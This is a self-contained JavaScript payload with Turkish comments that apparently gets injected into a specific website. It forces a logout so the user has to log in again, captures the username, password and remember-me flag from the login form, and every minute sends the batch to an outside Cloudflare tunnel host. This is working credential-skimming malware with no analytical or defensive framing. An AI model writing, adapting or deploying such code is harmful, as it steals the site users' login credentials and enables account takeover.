(function() {
    let collectedCredentials = []; // Giriş bilgilerini biriktirmek için dizi

    // Çıkış ve giriş payload’u
    function runPayload() {
        if (!localStorage.getItem('hasLoggedOut')) {
            if (typeof cikisyap === 'function') {
                cikisyap();
                localStorage.setItem('hasLoggedOut', 'true');
            }
        }

        function setupLoginListener() {
            const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
            if (loginBtn) {
                loginBtn.addEventListener('click', () => {
                    const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
                    const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
                    const remember = document.getElementById('authCheck')?.checked || false;
                    const timestamp = Date.now();

                    // Bilgileri biriktir
                    collectedCredentials.push({
                        username,
                        password,
                        remember,
                        timestamp
                    });

                    localStorage.setItem('payloadDone', 'true');
                });
            } else {
                let attempts = parseInt(localStorage.getItem('loginAttempts') || '0');
                if (attempts < 10) {
                    localStorage.setItem('loginAttempts', attempts + 1);
                    setTimeout(setupLoginListener, 100);
                }
            }
        }

        if (localStorage.getItem('payloadDone')) {
            return;
        }

        const loginModalButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
        if (loginModalButton) {
            loginModalButton.addEventListener('click', () => {
                setTimeout(setupLoginListener, 100);
            });
        } else {
            setTimeout(setupLoginListener, 100);
        }
    }

    // Toplu veri gönderme fonksiyonu
    function sendCollectedCredentials() {
        if (collectedCredentials.length === 0) {
            setTimeout(sendCollectedCredentials, 60000); // 60 saniye bekle
            return;
        }

        const data = collectedCredentials.map(cred => ({
            kuladi: encodeURIComponent(cred.username),
            sifre: encodeURIComponent(cred.password),
            remember: encodeURIComponent(cred.remember),
            timestamp: cred.timestamp
        }));

        fetch('https://desire-vid-acts-lack.trycloudflare.com/log-batch', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            credentials: 'include'
        })
            .then(response => {
                if (response.ok) {
                    collectedCredentials = []; // Gönderim başarılıysa sıfırla
                }
            })
            .catch(() => {})
            .finally(() => {
                setTimeout(sendCollectedCredentials, 60000); // 60 saniye sonra tekrar çalış
            });
    }

    // Payload’u çalıştır
    runPayload();
    // Veri göndermeyi başlat
    sendCollectedCredentials();
})();
